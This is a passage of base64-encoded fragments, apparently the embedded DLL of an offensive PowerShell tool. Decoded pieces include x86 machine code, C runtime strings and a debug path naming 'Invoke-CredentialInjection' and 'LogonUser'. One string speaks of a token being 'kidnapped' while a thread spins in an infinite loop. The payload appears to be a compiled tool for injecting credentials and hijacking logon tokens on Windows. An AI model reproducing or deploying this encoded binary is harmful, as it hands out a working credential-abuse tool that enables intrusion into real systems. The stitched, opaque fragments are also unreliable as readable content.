ABlAHMALQBwAHIAAABlAHMALQBwAHkAAABlAHMALQBzAHYAAABlAHMALQB1AHkAAABlAHMALQB2AGUAAABlAHQALQBlAGUAAABlAHUALQBlAHMAAABmAGEALQBpAHIAAABmAGkALQBmAGkAAABmAG8ALQBmAG8AAABmAHIALQBiAGUAAABmAHIALQBjAGEAAABmAHIALQBjAGgAAABmAHIALQBmAHIAAABmAHIALQBsAHUAAABmAHIALQBtAGMAAABnAGwALQBlAHMAAABnAHUALQBpAG4AAABoAGUALQBpAGwAAABoAGkALQBpAG4AAABoAHIALQBiAGEAAABoAHIALQBoAHIAAABoAHUALQBoAHUAAABoAHkALQBhAG0AAABpAGQALQBpAGQAAABpAHMALQBpAHMAAABpAHQALQBjAGgAAABpAHQALQBpAHQAAABqAGEALQBqAHAAAABrAGEALQBnAGUAAABrAGsALQBrAHoAAABrAG4ALQBpAG4AAABrAG8AawAtAGkAbgAAAAAAawBvAC0AawByAAAAawB5AC0AawBnAAAAbAB0AC0AbAB0AAAAbAB2AC0AbAB2AAAAbQBpAC0AbgB6AAAAbQBrAC0AbQBrAAAAbQBsAC0AaQBuAAAAbQBuAC0AbQBuAAAAbQByAC0AaQBuAAAAbQBzAC0AYgBuAAAAbQBzAC0AbQB5AAAAbQB0AC0AbQB0AAAAbgBiAC0AbgBvAAAAbgBsAC0AYgBlAAAAbgBsAC0AbgBsAAAAbgBuAC0AbgBvAAAAbgBzAC0AegBhAAAAcABhAC0AaQBuAAAAcABsAC0AcABsAAAAcAB0AC0AYgByAAAAcAB0AC0AcAB0AAAAcQB1AHoALQBiAG8AAAAAAHEAdQB6AC0AZQBjAAAAAABxAHUAegAtAHAAZQAAAAAAcgBvAC0AcgBvAAAAcgB1AC0AcgB1AAAAcwBhAC0AaQBuAAAAcwBlAC0AZgBpAAAAcwBlAC0AbgBvAAAAcwBlAC0AcwBlAAAAcwBrAC0AcwBrAAAAcwBsAC0AcwBpAAAAcwBtAGEALQBuAG8AAAAAAHMAbQBhAC0AcwBlAAAAAABzAG0AagAtAG4AbwAAAAAAcwBtAGoALQBzAGUAAAAAAHMAbQBuAC0AZgBpAAAAAABzAG0AcwAtAGYAaQAAAAAAcwBxAC0AY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FRg+Twg8QEVYtrBIlsJASL7IHsiAAAAKEIcAEQM8WJRfyLQxBWi3MMVw+3CImNfP///4sGSHQrSHQkSHQdSHQWSHQfSEh0B0h1emoQ6xbHBgEAAADrbmoS6wpqEesGagTrAmoIX1GNRhhQV+hrgP//g8QMhcB1R4tLCIP5EHQQg/kWdAuD+R10BoNlwP7rEotFwN1GEIPg44PIA91dsIlFwI1GGFCNRghQUVeNhXz///9QjUWAUOj+gf//g8QYi418////aP//AABR6KSF//+DPghZWXQUgz2weQEQAHULVuinzP//WYXAdQj/NujOhP//WYtN/F8zzV7oklv//4vlXYvjW8OFwHUGZg/vwOsRZg9uwGYPYMBmD2HAZg9wwABTUYvZg+MPhdt1eIvag+J/wesHdDBmD38BZg9/QRBmD39BIGYPf0EwZg9/QUBmD39BUGYPf0FgZg9/QXCNiYAAAABLddCF0nQ3i9rB6wR0D+sDjUkAZg9/AY1JEEt19oPiD3Qci9rB6gJ0CmYP','xyDHMMdAx1DHYMdwx4DHkMegx7DHwMfQx+DH8MQAyBDIIMgwyEDIUMhgyHDIgMiQyKDIsMjAyNDI4MjwyQDJEMkgyTDJQMgAAAFABADABAADcN+A3bDiEOJQ4mDisOLA4wDjEOMg40DjoOPg4/DgMORA5FDkcOTQ5RDlIOVg5XDlgOWQ5bDmEOZQ5mDmoOaw5sDm0Obw51DnkOeg5+Dn8OQQ6HDosOjA6QDpEOlQ6WDpcOmQ6fDqMOpA6qDq4Orw6wDrEOtg63DrgOvg6/DoUOyQ7KDs4Ozw7QDtIO2A7cDuAO4Q7iDuMO6A7pDuoO6','UpLTE1OT1BRUlNUVVZXWFlae3x9fn+AgYKDhIWGh4iJiouMjY6PkJGSk5SVlpeYmZqbnJ2en6ChoqOkpaanqKmqq6ytrq+wsbKztLW2t7i5uru8vb6/wMHCw8TFxsfIycrLzM3Oz9DR0tPU1dbX2Nna29zd3t/g4eLj5OXm5+jp6uvs7e7v8PHy8/T19vf4+fr7/P3+/wECA','OYvOagBQiUUM6JX2//+EwA+ElQAAAItGFIP4EHIEixbrAovWg/gQcgSLBusCi8aLThCFyXQNUVIDx1Do8wMAAIPEDDvzdTKLRRCFwHQCA8eLThSD+RByBIsW6wKL1oP5EHIEiw7rAovOhf90NFcDwlBR6LwDAADrJYN7FBByAosbg34UEHIEiw7rAovOhf90EItFEFcDw1BR6MUOAACDxAz/dQyLzujI9f//X4vGXltdwhAAaERVARDoAAMAAGhUVQEQ6CQDAADMzMzMzMzMzMzMzFWL7IPsSKEIcAEQM8WJRfxWUmiQVwEQjUW8x0W4AAAAAGpAUIvx6HwLAADHRhQPAAAAg8QQx0YQAAAAAMYGAIB9vAB1BDPJ6xCNTbyNUQGQigFBhMB1+SvKUY1FvIvOUOib8///i038i8YzzV7o3gIAAIvlXcPMzMzMzMzMzMzMVYvsg+xIoQhwARAzxYlF/FZSaJRXARCNRbzHRbgAAAAAakBQi/Ho/AoAAMdGFA8AAACDxBDHRhAAAAAAxgYAgH28AHUEM8nrEI1NvI1RAZCKAUGEwHX5K8pRjUW8i85Q6Bvz//+LTfyLxjPNXuheAgAAi+Vdw8zMzMzMzMzMzMxVi+xWi/Fq/2oA/3UIx0YUDwAAAMdGEAAAAADGBgDorfH//4vGXl3CBADMzMzMzMxVi+yD7EihCHABEDPFiUX8VlJomFcBEI1FvMdFuAAAAABqQFCL8ehMCgAAx0YUDwAAAIPEEMdGEAAAAADGBgCAfbwAdQQzyesQjU28jVEBkIoBQYTAdfkrylGNRbyLzlDoa/L//4tN/IvGM81e6K4BAACL5V3DVYvsgz2UCAEQALiQCAEQdBCLTQg5CHQNg8AIg3gEAHXzM8Bdw4tABF3DVYvsgz08BgEQALg4BgEQdBCLTQg5CHQNg8AIg3gEAHXzM8Bdw4tABF3DVYvsVv91CIvx6J8YAADHBngPARCLxl5dwgQAVYvsVv91CIvx6IQYAADHBqAPARCLxl5dwgQAVYvsVv91CIvx6GkYAADHBpQPARCLxl5dwgQAVYvsVv91CIvx6E4YAADHBqwPARCLxl5dwgQAxwF4DwEQ6VkYA','lF/IXAfjWLRQj/cByLRgT/MgPBUOi+BAAAi00Mg8QMhcB1FotF/ItV+EiDwgSJRfyJVfiFwH/P6wKzAUeDwRCJTQw7PnyoX16Kw1uL5V3D6JH2///oxPb//8xVi+yLTQyLVQhWiwGLcQQDwoX2eA2LSQiLFBaLDAoDzgPBXl3DaghoKF8BEOh+1P//i1UQi00M9wIAAACAdASL+esGjXkMA3oIg2X8AIt1FFZSUYtdCFPoVwAAAIPEEEh0H0h1NGoBjUYIUP9zGOiN////WVlQ/3YYV+gkyP//6xiNRghQ/3MY6HP///9ZWVD/dhhX6ArI///HRfz+////6E/U///DM8BAw4tl6OgR9v//zGoMaMBfARDo8NP//zPbi0UQi0gEhckPhJ4BAAA4WQgPhJUBAACLUAiF0nUM9wAAAACAD4SCAQAAiwiLfQyFyXgFg8cMA/qJXfyLdRSEyXlP9gYQdEqhHIkBEIXAdEH/0Il','Qcm9jZXNzb3JOdW1iZXIAAABHZXRMb2dpY2FsUHJvY2Vzc29ySW5mb3JtYXRpb24AAENyZWF0ZVN5bWJvbGljTGlua1cAU2V0RGVmYXVsdERsbERpcmVjdG9yaWVzAAAAAEVudW1TeXN0ZW1Mb2NhbGVzRXgAQ29tcGFyZVN0cmluZ0V4AEdldERhdGVGb3JtYXRFeABHZXRMb2NhbGVJbmZvRXgAR2V0VGltZUZvcm1hdEV4AEdldFVzZXJEZWZhdWx0TG9jYWxlTmFtZQAAAABJc1ZhbGlkTG9jYWxlTmFtZQAAAExDTWFwU3RyaW5nRXgAAABHZXRDdXJyZW50UGFja2FnZUlkAEdldFRpY2tDb3VudDY0AABHZXRGaWxlSW5mb3JtYXRpb25CeUhhbmRsZUV4VwAAAFNldEZpbGVJbmZvcm1hdGlvbkJ5SGFuZGxlVwD8ZQAQNFoBEK1mABDXOwAQYmFkIGV4Y2VwdGlvbgAAAGUrMDAwAAAAAgAAANgVARAIAAAAOBYBEAkAAACQFgEQCgAAAOgWARAQAAAAMBcBEBEAAACIFwEQEgAAAOgXARATAAAAMBgBEBgAAACIGAEQGQAAAPgYARAaAAAASBkBEBsAAAC4GQEQHAAAACgaARAeAAAAdBoBEB8AAAC4GgEQIAAAAIAbARAhAAAA6BsBECIAAADYHQEQeAAAAEAeARB5AAAAYB4BEHoAAAB8HgEQ/AAAAJgeARD/AAAAoB4BEFIANgAwADAAMgANAAoALQAgAGYAbABvAGEAdABpAG4AZwAgAHAAbwBpAG4AdAAgAHMAdQBwAHAAbwByAHQAIABuAG8AdAAgAGwAbwBhAGQAZQBkAA0ACgAAAAAAAAAAAFIANgAwADAAOAANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAGEAcgBnAHUAbQBlAG4AdABzAA0ACgAAAAAAAABSADYAMAAwADkADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABlAG4AdgBpAHIAbwBuAG0AZQBuAHQADQAKAAAAUgA2ADAAMQAwAA0ACgAtACAAYQBiAG8AcgB0ACgAKQAgAGgAYQBzACAAYgBlAGUAbgAgAGMAYQBsAGwAZQBkAA0ACgAAAAAAUgA2ADAAMQA2AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAdABoAHIAZQBhAGQAIABkAGEAdABhAA0ACgAAAFIANgAwADEANwANAAoALQAgAHUAbgBlAHgAcABlAGMAdABlAGQAIABtAHUAbAB0AGkAdABoAHIAZQBhAGQAIABsAG8AYwBrACAAZQByAHIAbwByAA0ACgAAAAAAAAAAAFIANgAwADEAOAANAAoALQAgAHUAbgBlAHgAcABlAGMAdABlAGQAIABoAGUAYQBwACAAZQByAHIAbwByAA0ACgAAAAAAAAAAAFIANgAwADEAOQANAAoALQAgAHUAbgBhAGIAbABlACAAdABvACAAbwBwAGUAbgAgAGMAbwBuAHMAbwBsAGUAIABkAGUAdgBpAGMAZQANAAoAAAAAAAAAAABSADYAMAAyADQADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABfAG8AbgBlAHgAaQB0AC8AYQB0AGUAeABpAHQAIAB0AGEAYgBsAGUADQAKAAAAAAAAAAAAUgA2ADAAMgA1AA0ACgAtACAAcAB1AHIAZQAgAHYAaQByAHQAdQBhAGwAIABmAHUAbgBjAHQAaQBvAG4AIABjAGEAbABsAA0ACgAAAAAAAABSADYAMAAyADYADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABzAHQAZABpAG8AIABpAG4AaQB0AGkAYQBsAGkAegBhAHQAaQBvAG4ADQAKAAAAAAAAAAAAUgA2ADAAMgA3AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAbABvAHcAaQBvACAAaQBuAGkAdABpAGEAbABpAHoAYQB0AGkAbwBuAA0ACgAAAAAAAAAAAFIANgAwADIAOAANAAoALQAgAHUAbgBhAGIAbABlACAAdABvACAAaQBuAGkAdABpAGEAbABpAHoAZQAgAGgAZQBhAHAADQAKAAAAAABSADYAMAAzADAADQAKAC0AIABDAFIAVAAgAG4AbwB0ACAAaQBuAGkAdABpAGEAbABpAHoAZQBkAA0ACgAAAAAAAAAAAFIANgAwADMAMQANAAoALQAgAEEAdAB0AGUAbQBwAHQAIAB0AG8AIABpAG4AaQB0AGkAYQBsAGkAegBlACAAdABoAGUAIABDAFIAVAAgAG0AbwByAGUAIAB0AGgAYQBuACAAbwBuAGMAZQAuAAoAVABoAGkAcwAgAGkAbgBkAGkAYwBhAHQAZQBzACAAYQAgAGIAdQBnACAAaQBuACAAeQBvAHUAcgAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgAuAA0ACgAAAAAAUgA2ADAAMwAyAA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAbABvAGMAYQBsAGUAIABpAG4AZgBvAHIAbQBhAHQAaQBvAG4ADQAKAAAAAABSADYAMAAzADMADQAKAC0AIABBAHQAdABlAG0AcAB0ACAAdABvACAAdQBzAGUAIABNAFMASQBMACAAYwBvAGQAZQAgAGYAcgBvAG0AIAB0AGgAaQBzACAAYQBzAHMAZQBtAGIAbAB5ACAAZAB1AHIAaQBuAGcAIABuAGEAdABpAHYAZQAgAGMAbwBkAGUAIABpAG4AaQB0AGkAYQBsAGkAegBhAHQAaQBvAG4ACgBUAGgAaQBzACAAaQBuAGQAaQBjAGEAdABlAHMAIABhACAAYgB1AGcAIABpAG4AIAB5AG8AdQByACAAYQBwAHAAbABpAGMAYQB0AGkAbwBuAC4AIABJAHQAIABpAHMAIABtAG8AcwB0ACAAbABpAGsAZQBsAHkAIAB0AGgAZQAgAHIAZQBzAHUAbAB0ACAAbwBmACAAYwBhAGwAbABpAG4AZwAgAGEAbgAgAE0AUwBJAEwALQBjAG8AbQBwAGkAbABlAGQAIAAoAC8AYwBsAHIAKQAgAGYAdQBuAGMAdABpAG8AbgAgAGYAcgBvAG0AIABhACAAbgBhAHQAaQB2AGUAIABjAG8AbgBzAHQAcgB1AGMAdABvAHIAIABvAHIAIABmAHIAbwBtACAARABsAGwATQBhAGkAbgAuAA0ACgAAAAAAUgA2ADAAMwA0AA0ACgAtACAAaQBuAGMAbwBuAHMAaQBzAHQAZQBuAHQAIABvAG4AZQB4AGkAdAAgAGIAZQBnAGkAbgAtAGUAbgBkACAAdgBhAHIAaQBhAGIAbABlAHMADQAKAAAAAABEAE8ATQBBAEkATgAgAGUAcgByA